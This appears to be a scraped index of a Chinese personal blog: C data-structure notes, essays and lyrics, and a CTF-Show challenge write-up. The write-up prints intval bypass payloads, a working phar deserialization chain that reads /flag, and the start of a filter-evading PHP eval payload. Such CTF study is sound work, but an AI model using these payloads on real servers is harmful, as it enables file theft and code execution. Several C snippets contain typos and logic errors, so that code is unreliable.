dlink_node&#123; datatype info; struct dlink_node *llink,*rlink;&#125;dnode;//初始化dnode *init()&#123; return NULL;&#125;//打印输出void dnode*(dnode *head)&#123; dnode *p = head; if(!p) &#123;printf(&quot;双链表是空的！\\n&quot;);&#125; else&#123; printf(&quot;双链表中各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125; &#125;&#125;//查找 第 i 个结点dnode *find_i(dnode *head,int i)&#123; dnode *p = head; int j = 1; if(i &lt; 1) &#123;printf(&quot;第%d个结点位置不存在！\\n,i&quot;);return NULL;&#125; while(p &amp;&amp; i != j)&#123; p = p-&gt;rlink; j++; &#125; if(!p) &#123;printf(&quot;第%d个结点位置不存在！\\n,i&quot;);return NULL;&#125; //为什么？？ return p;&#125;//在 第 i 个结点后 插入 值为 x 的结点dnode *insert(dnode *head,datatype x,int i)&#123; dnode *p,*q; p = (dnode*)malloc(sozeof(dnode));//为新的结点分配空间 p-&gt;next = x; //设置新的结点值 if(i == 0)&#123; //插入到第一个结点 p-&gt;llink = NULL; p-&gt;rlink = head; if(!head)&#123; head = p; &#125;else&#123; head-&gt;llink = p; head = p; &#125; return head; &#125; q = find_i(head,i); if(!q) &#123;printf(&quot;第 %d 个结点不存在，无法插入！\\n&quot;); return head;&#125; if(q-&gt;rlink == NULL)&#123; //插到最后一个结点 p-&gt;rlink = q-&gt;rlink; p-&gt;llink = q; q-&gt;rlink = p; &#125;else&#123; //中间插入 p-&gt;rlink = q-&gt;rlink; p-&gt;llink = q; q-&gt;rlink-&gt;llink = p; q-&gt;rlink = p; &#125; return head;&#125;//删除 值为 x 的结点dnode *delete(dnode *head,datatype x)&#123; dnode *q; if(!head)&#123; printf(&quot;双链表为空，无法删除！\\n&quot;); return head; &#125; q = head; while(q &amp;&amp; q-&gt;info != x) //寻找 值为 x 的结点的位置 q = q-&gt;rlink; if(!q)&#123; printf(&quot;找不到结点的位置！\\n&quot;); &#125; if(q == head &amp;&amp; head-&gt;rlink)&#123; //需要删除的是第一个结点，而且表中 不只有这一个结点 head = head-&gt;rlink; head-&gt;llink = NULL; free(q); return head; &#125; if(q == head &amp;&amp; !head-&gt;rlink)&#123; //需要删除的是第一个结点，而且表中 仅仅只有这一个结点 free(q); return NULL; //直接将双链表 置空，即初始化即可 &#125;else&#123; if(!q-&gt;rlink)&#123; //被删除的是 链表 最后一个结点 q-&gt;llink-&gt;rlink = NULL; free(q); return head; &#125;else&#123; //需要删除的是中间的结点 q-&gt;llink-&gt;rlink = q-&gt;rlink; q-&gt;rlink-&gt;llink = q-&gt;llink; free(q); return head; &#125; &#125;&#125; 链式栈栈的链式存储，特殊的单链表 插入 与 删除 在 单链表的 同一端进行 栈顶指针 top指向第一个结点的位置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;typedef int datatype;typedef struct link_stack&#123; datatype info; struct link_stack *top,*next;&#125;ndoe;//初始化：建立一个空的 栈node *init()&#123; return NULL;&#125;//判断 是否为空int empty(node *top)&#123; return (top?0:1);&#125;//取得链式栈 栈顶的结点值datatype read_top(node *top)&#123; if(!top) &#123;printf(&quot;链式栈是空的！\\n&quot;); exit(1);&#125; return (top-&gt;info);&#125;//打印输出void print(node *top)&#123; node *p; p = top; printf(&quot;\\n&quot;); if(!p) printf(&quot;链式栈是空的！\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125;&#125;//进栈：插入值为 x 的结点 为 topnode *push(node *top,datatype x)&#123; node *p; p = (node*)malloc(sizeof(ndoe)); p-&gt;info = x; p-&gt;next = top; top = p; return top;&#125;//出栈：删除链式栈栈顶结点 topnode *delete(node *top)&#123; node *q; if(!top) &#123;printf(&quot;链式栈是空的！\\n&quot;);return NULL;&#125; q = top; top = top-&gt;next; free(q); return top;&#125; 链式队列队列的链式存储，特殊的单链表 插入 与 删除 分别在单链表的两端进行 队首 front 队尾 rear 指向最后一个结点，即最后一个结点的 next 是 NULL 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;stdio.h&gt;typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next; //结点定义&#125;node;typedef struct&#123; node *front,*rear; //队首 队尾指针 定义&#125;queue;//初始化：建立一个 空的链式队列queue *init()&#123; queue *qu; qu = (queue*)malloc(sizeof(queue)); qu-&gt;front = NULL; qu-&gt;rear = NULL; return qu;&#125;//判断 链式队列 是否为空int empty(queue qu)&#123; return (qu.front ? 0:1);&#125;//打印输出void print(queue *qu)&#123; node *p; printf(&quot;\\n&quot;); p = qu-&gt;front; if(!p) printf(&quot;链式队列的空的！\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125;&#125;//取得链式队列队首结点值datatype read_front(queue qu)&#123; if(!p.front)&#123; printf(&quot;链式队列是空的！\\n&quot;); exit(1); &#125; return (qu.front-&gt;info);&#125;//插入操作 队尾插入queue *insert(queue *qu,datatype x)&#123; node *p; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = NULL; if(qu-&gt;front == NULL) qu-&gt;front = qu-&gt;rear = p; //当队列本身是 空 时 else&#123; qu-&gt;rear-&gt;next = p; //队尾插入 qu-&gt;rear = p; &#125; return qu;&#125;//删除操作：队首删除queue *delete(queue *qu)&#123; node *q; if(!qu-&gt;front) &#123;printf(&quot;队列为空，无法插入！\\n&quot;); return qu;&#125; q = qu-&gt;front; qu-&gt;front = q-&gt;next; free(q); if(qu-&gt;front == NULL) qu-&gt;rear = NULL; return qu;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"链式存储","slug":"链式存储","permalink":"https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"}],"author":"xizhi-future"},{"title":"顺序表、栈、队列","slug":"顺序表、栈、队列","date":"2021-10-05T11:16:19.000Z","updated":"2021-10-07T09:33:25.383Z","comments":true,"path":"2021/10/05/顺序表、栈、队列/","link":"","permalink":"https://xizhi-future.github.io/2021/10/05/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97/","excerpt":"","text":"[TOC] 顺序表插入 删除 任意位置，特点：顺序存储 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;stdio.h&gt;#define MAXSIZE 100typedef int datatype;typedef struct&#123; datatype a[MAXSIZE]; int size;&#125;sequence_list;//初始化void init(sequence_list *slt)&#123; slt-&gt;size = 0;&#125;//在顺序表后部进行插入操作void insert_behind(sequence_list *slt,datatype x)&#123; if(slt-&gt;size == MAXSIZE)&#123; printf(&quot;顺序表是满的！&quot;);exit(1); slt-&gt;a[slt-&gt;size]=x; slt-&gt;size = slt-&gt;size+1; &#125;&#125;//打印void print(sequence_list slt)&#123; int i; if(!slt.size) printf(&quot;顺序表是空的！&quot;); else for(i=0;i&lt;slt.size;i++) printf(&quot;%5d&quot;,slt.a[i]);&#125;//判断空 int empty(sequence_list slt)&#123; return(slt.size==0?0:1);&#125;//查找 值为 x 的 结点位置int find_x(sequence_list slt,datatype x)&#123; int i=0; while(slt.a[i]!=x &amp;&amp; i&lt;slt.size) i++; return(i&lt;slt.size?i:-1); &#125;//取得 第 i 位置的 值int get_i(sequence_list slt,int i)&#123; if(i&lt;0 || i&gt;slt.size)&#123; printf(&quot;指定位置不存在！&quot;); &#125; else return(slt.a[i]);&#125;//任意位置插入void insert_medium(sequence_list *slt,int position,datatype x)&#123; int i; if(slt-&gt;size == MAXSIZE) &#123;printf(&quot;顺序表是满的！&quot;);exit(1);&#125; if(position &lt; 0 || position &gt; slt-&gt;size) &#123;printf(&quot;指定插入位置不存在！&quot;);exit(1);&#125; for(i=slt-&gt;size;i&gt;position;i--) slt-&gt;a[i] = slt-&gt;a[i-1]; slt-&gt;a[position] = x; slt-&gt;size++;&#125;//删除 某位置 结点值void delete(sequence_list *slt,int position)&#123; int i; if(slt-&gt;size == 0) &#123;printf(&quot;顺序表是空的！&quot;);exit(1);&#125; if(position&lt;0 || position &gt; slt.size) &#123;printf(&quot;指定删除位置不存在！&quot;);exit(1);&#125; for(i=position;i&lt;slt-&gt;size;i++) slt-&gt;a[i] = slt-&gt;a[i+1]; slt-&gt;size--;&#125; 栈先进后出 插入 删除 同一端进行，为 栈顶，另一端封住，为栈底 插入 删除 操作 称为 进栈 出栈 栈实现：顺序存储、链式存储 以顺序存储为例：栈底：a[0] 栈顶 top 设定 top 所指的位置 是 下一个将要插入结点的位置 栈为空 ：top=0 1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;#define MAXSIZE 100typedef int datatype;typedef struct&#123; datatype a[MAXSIZE]; int top;&#125;sequence_stack;//初始化void init(sequence_stack *st)&#123; st-&gt;top = 0;&#125;//判断 是否 空int empty(sequence_stack st)&#123; return(st.top==0?0:1);&#125;//取得 栈顶结点值datatype get_top(sequence_stack st)&#123; if(empty(st)) &#123;printf(&quot;栈是空的！&quot;);exit(1);&#125; else return st.a[st.top-1];&#125;//插入 void insert(sequence_stack *st,datatype x)&#123; if(st-&gt;top == MAXSIZE) &#123;printf(&quot;栈是满的！&quot;);exit(1);&#125; st-&gt;a[top] = x; st-&gt;top++;&#125;//删除void delete(sequence_stack *st)&#123; if(st-&gt;top == 0) &#123;printf(&quot;栈是空的！&quot;);exit(1);&#125; st-&gt;top--;&#125; 12//括号匹配 队列先进先出 特点：插入 删除 操作 分别在表的两端进行， 插入 即 队尾 ， 删除即 队首 front 队首结点在数组元素中的下标， rear 队尾结点在数组中元素下标的 下一个位置，即 即将插入的结点 在数组中的下标 称之为 进队 和 出队 1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;#define MAXSIZE 100typedef int datatype;typedef struct&#123; datatype a[MAXSIZE]; int front; int rear;&#125;sequence_queue;//初始化void init(sequence_queue *sq)&#123; sq-&gt;front = sq-&gt;rear = 0;&#125;//判断是否是 空int empty(sequence_queue sq)&#123; return(sq.front==sq.rear?0:1);&#125;//打印void print(sequence_queue sq)&#123; int i; if(empty(sq))&#123; printf(&quot;顺序队列是空的！&quot;); &#125; else for(i=sq.front;i&lt;sq.rear;i++) printf(&quot;%5d&quot;,sq.a[i]);&#125;//插入void insert(sequence_queue *sq,datatype x)&#123; int i; if(sq-&gt;rear == MAXSIZE) &#123;printf(&quot;顺序队列是满的！&quot;);exit(1);&#125; sq-&gt;a[sq-&gt;rear] = x; sq-&gt;rear = sq-&gt;rear+1;&#125;//删除void delete(sequence_queue *sq)&#123; if(sq-&gt;front == sq-&gt;rear) &#123;printf(&quot;顺序队列是空的！&quot;);exit(1);&#125; sq-&gt;front++;&#125; 循环队列中 满与空 的条件均是 front==rear 出现问题 问题解决：满 的条件 (rear+1)%MAXSIZE=front 123456789101112131415//循环队列 插入 操作void insert_c(sequence_queue *sq,datatype x)&#123; int i; if((sq-&gt;rear+1)%MAXSIZE == sq-&gt;front) &#123;printf(&quot;循环队列是满的！&quot;);exit(1);&#125; sq-&gt;a[sq-&gt;rear] = x; sq-&gt;rear = (sq-&gt;rear+1)%MAXSIZE;&#125;//循环队列 删除 操作void delete_c(sequence_queue *sq)&#123; if(sq-&gt;front == sq-&gt;rear) &#123;printf(&quot;循环队列是空的！&quot;);exit(1);&#125; sq-&gt;front = (sq-&gt;front+1)%MAXSIZE;&#125; 第二章 — 题目1.设计一个算法，求顺序表中值为x的结点的个数。算法： 12345678910111213141516#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;int count(sqlist L,int x)&#123; int i,sum = 0; for(i=0;i&lt;L.length;i++)&#123; if(L.data[i] == x)&#123; sum++; &#125; &#125; return(sum);&#125; 测试： 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;int count(sqlist L,int x)&#123; int i,sum = 0; for(i=0;i&lt;L.length;i++)&#123; if(L.data[i] == x)&#123; sum++; &#125; &#125; return(sum);&#125;int main()&#123; sqlist list = &#123;&#123;1,5,5,2,7,5,9,0&#125;,10&#125;; printf(&quot;count = %d\\n&quot;,count(list,5)); //查找值为5的元素个数 return 0;&#125; 2.设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a[0]等于原来的最后一个元素，a[1] 等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。算法： 12345678910111213141516171819#include&lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist; void reverse(sqlist *L)&#123; int i,j,t; i = 0; // 第一个元素位置 j = L-&gt;length - 1; // 最后一个元素位置 while(i&lt;j)&#123; t = L-&gt;data[i]; // 将第一个元素存入 临时的 t 中 L-&gt;data[i++] = L-&gt;data[j]; // 把最后一个元素值赋给第一个元素的位置 L-&gt;data[j--] = t; // 再把 存入 t 的第一个元素的值赋给 // 注意：j-- 的意思：首先进行赋值然后再进行自减 &#125;&#125; 测试： 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist; void reverse(sqlist *L)&#123; int i,j,t; i = 0; // 第一个元素位置 j = L-&gt;length - 1; // 最后一个元素位置 while(i&lt;j)&#123; t = L-&gt;data[i]; // 将第一个元素存入 临时的 t 中 L-&gt;data[i++] = L-&gt;data[j]; // 把最后一个元素值赋给第一个元素的位置 L-&gt;data[j--] = t; // 再把 存入 t 的第一个元素的值赋给 // 注意：j-- 的意思：首先进行赋值然后再进行自减 &#125;&#125;int main()&#123; int i; sqlist list = &#123;&#123;1,2,3,4,5,6,7,8,9,0&#125;,10&#125;; reverse(&amp;list); for(i=0;i&lt;list.length;i++)&#123; printf(&quot;%d\\n&quot;,list.data[i]); &#125; return 0;&#125; 3.已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。算法： 1234567891011121314151617181920#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;void insert(sqlist *L,datatype x)&#123; int i; if(L-&gt;length &lt; N)&#123; //确保顺序表不满，能够进行插入数据 i = L-&gt;length - 1; // i 是最后一个元素位置 while(i &gt;= 0 &amp;&amp; L-&gt;data[i] &gt; x)&#123; // 确保 x 小于已给位置，便于将 x 插入到其前面 L-&gt;data[i+1] = L-&gt;data[i]; i--; &#125; L-&gt;data[i+1] = x; // 插入 x L-&gt;length++; // 顺序表长度加 1 &#125;&#125; 测试： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;void insert(sqlist *L,datatype x)&#123; int i; if(L-&gt;length &lt; N)&#123; //确保顺序表不满，能够进行插入数据 i = L-&gt;length - 1; // i 是最后一个元素位置 while(i &gt;= 0 &amp;&amp; L-&gt;data[i] &gt; x)&#123; // 确保 x 小于已给位置，便于将 x 插入到其前面 L-&gt;data[i+1] = L-&gt;data[i]; i--; &#125; L-&gt;data[i+1] = x; // 插入 x L-&gt;length++; // 顺序表长度加 1 &#125;&#125;int main()&#123; int i; sqlist list = &#123;&#123;1,3,6,8,22,44,89,122,243,534&#125;,10&#125;; insert(&amp;list,350); for(i=0;i&lt;list.length;i++)&#123; printf(&quot;%d\\n&quot;,list.data[i]); &#125; return 0;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"顺序表","slug":"顺序表","permalink":"https://xizhi-future.github.io/tags/%E9%A1%BA%E5%BA%8F%E8%A1%A8/"},{"name":"线性存储","slug":"线性存储","permalink":"https://xizhi-future.github.io/tags/%E7%BA%BF%E6%80%A7%E5%AD%98%E5%82%A8/"}],"author":"xizhi-future"},{"title":"世间美好与你环环相扣","slug":"世间美好与你环环相扣","date":"2021-10-01T11:42:25.000Z","updated":"2021-10-01T11:43:15.379Z","comments":true,"path":"2021/10/01/世间美好与你环环相扣/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/","excerpt":"","text":"世间美好与你环环相扣偏偏秉烛夜游 午夜星辰 似奔走之友 爱你每个结痂伤口 酿成的陈年烈酒 入喉尚算可口 怎么泪水 还偶尔失守 邀你细看心中缺口 裂缝中留存 温柔 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 知道你不能 还要你感受 让星光加了一点彩虹 让樱花偷偷 吻你额头 让世间美好 与你环环相扣 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 知道你不能 还要你感受 让星光加了一点彩虹 当樱花开的纷纷扬扬 当世间美好 与你环环相扣","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"唯愿我们","slug":"唯愿我们","date":"2021-10-01T11:40:26.000Z","updated":"2021-10-01T11:41:42.683Z","comments":true,"path":"2021/10/01/唯愿我们/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/","excerpt":"","text":"唯愿我们从鲜衣怒马到鬓染白发 不过弹指一刹那； 从小桥人家到沧海无涯 匆匆一眼尽繁华。 流年似水， 往事不可追； 光阴似箭， 物是人已非。 让烦恼缠绕心尖， 生活一片颓然； 让痛苦徘徊耳边， 人生全是不满。 感情的遗憾， 不如放手随他。 想送你回家的人， 东西南北都顺路； 想陪你吃饭的人， 酸甜苦辣都可口； 想见你一面的人， 隔山隔海都能来。 生活的刁难， 不如看淡放宽。 生命这一程， 交织着风霜雨雪； 人生这一段， 夹杂着泥泞坎坷。 没有跨不过的河， 没有迈不过的坎。 内心的执迷， 不如随风飘散。 有一往无前， 就有知难而退。 看透了， 便是过眼云烟； 想通了， 不过昙花一现。 不念过去， 不畏将来， 你若不放心上， 岁月便会无恙。 边走边看， 是一种优雅； 边走边忘， 是一份豁达。 敬往事一杯酒， 愿岁月不回头。 唯愿我们： 过去的， 别再遗憾； 未来的， 无须忧虑； 现在的， 加倍珍惜。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"难熬的一夜","slug":"难熬的一夜","date":"2021-10-01T11:38:19.000Z","updated":"2021-10-01T11:39:46.754Z","comments":true,"path":"2021/10/01/难熬的一夜/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/","excerpt":"","text":"难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。 这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就 这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多 次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主 女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受 这一切。哎，总之，我很伤心，更为之心痛。 天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不 是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光 明。 就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。 2021.8.27 6：12","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"查无此人","slug":"查无此人","date":"2021-10-01T11:36:26.000Z","updated":"2021-10-01T11:51:12.530Z","comments":true,"path":"2021/10/01/查无此人/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/","excerpt":"","text":"村上春树说 “你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带 着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成 为善良的人。” 然后，在评论中我看到了，，，查无此人。。。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"胡适与江冬秀","slug":"胡适与江冬秀","date":"2021-10-01T11:34:34.000Z","updated":"2021-10-01T11:35:33.614Z","comments":true,"path":"2021/10/01/胡适与江冬秀/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/","excerpt":"","text":"她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴 上说着表哥表妹，背地里却狠狠背叛了她。 张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。” 她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在 生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。 胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为 江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明 真的就不算什么事儿了。 思君不见，倍感思君；别离难忍，忍痛别离。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF-Show-吃瓜杯","slug":"CTF-Show-吃瓜杯","date":"2021-10-01T11:19:34.000Z","updated":"2021-10-01T11:20:18.220Z","comments":true,"path":"2021/10/01/CTF-Show-吃瓜杯/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"CTF Show 吃瓜杯篇。","text":"CTF Show 吃瓜杯篇。 CTF Show 吃瓜杯热身123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 123?num=%20010574?num=%0c010574?num=%0a010574 ATTupzip 文件上传 + 文件包含 file_get_contents —&gt; phar 反序列化 文件内容过滤 &lt;? php ，过滤 &lt;? ，无法正常解析为 php 代码 上传成功发现：序列化与反序列化 123456789101112131415161718192021class View &#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun = &quot;:)&quot;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$filename = $_POST[&quot;file&quot;];$stat = @stat($filename); 12__toString() //把类当作字符串使用时触发 echo 对象; $text=$test+$对象； __invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用 生成 .phar 文件： 我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass View&#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun=&#x27;:)&#x27;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$phar = new Phar(&#x27;123.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;);$b = new Fun();$b-&gt;fun= new Fun();$b-&gt;fun-&gt;fun=new View(); # 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用$b-&gt;fun-&gt;fun-&gt;fn=&#x27;/flag&#x27;;$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$phar -&gt; setMetadata($b);$phar -&gt; stopBuffering(); &lt;? 过滤，使用 实体html 编码代替 ，&amp;lt; &amp;gt; 访问，生成 123.phar 更改后缀得到 123.zip 上传 查询 123.zip 1file=phar://123.zip 魔女 注册 注册成功，登录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263layui.use([&#x27;layer&#x27;, &#x27;form&#x27;,&#x27;table&#x27;,&#x27;element&#x27;], function()&#123; var layer = layui.layer ,form = layui.form ,table = layui.table ,element = layui.element &#125;); function home()&#123; $.cookie(&#x27;m&#x27;,&#x27;main&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function logout()&#123; $.cookie(&#x27;m&#x27;,&#x27;logout&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function saveAvatar()&#123; $.cookie(&#x27;m&#x27;,&#x27;download&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;avatar.jpg|true&#x27;); window.open(location.href); &#125; function avatar()&#123; layer.prompt(&#123; formType: 0, value: &#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;, title: &#x27;修改头像&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;xixi|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changeavatar&#x27;); location.replace(location.href); &#125;); &#125; function profile()&#123; $.cookie(&#x27;m&#x27;,&#x27;page&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function changePSW()&#123; layer.prompt(&#123; formType: 0, value: &#x27;请输入当前密码&#x27;, title: &#x27;修改密码&#x27;, &#125;, function(value, index, elem)&#123; $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+value); layer.close(index); layer.prompt(&#123; formType: 0, value: &#x27;请输入新密码&#x27;, title: &#x27;修改密码&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,$.cookie(&#x27;ctfshow&#x27;)+&#x27;|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changepwd&#x27;); location.replace(location.href); &#125;); &#125;); &#125; shellme_Revenge 1/?looklook=1 1&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; assert() 1&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // 